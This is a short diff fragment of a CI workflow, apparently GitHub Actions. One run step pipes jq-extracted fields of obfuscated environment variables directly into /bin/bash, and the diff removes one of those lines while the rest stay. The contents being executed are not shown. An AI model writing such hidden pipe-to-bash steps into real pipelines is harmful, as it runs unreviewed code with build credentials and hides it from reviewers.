@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$zmvcu06" | jq -r .ticko276 | /bin/bash
           echo $n93125 | jq -r .mpifg7 | /bin/bash
           echo $gd6117 | jq -r .xbig0359 | /bin/bash
-          echo $hilh4 | jq -r .uk75 | /bin/bash
           printf '%s' "$zmcdv67487" | jq -r .xcw328 | /bin/bash
 
       - name: Persist data
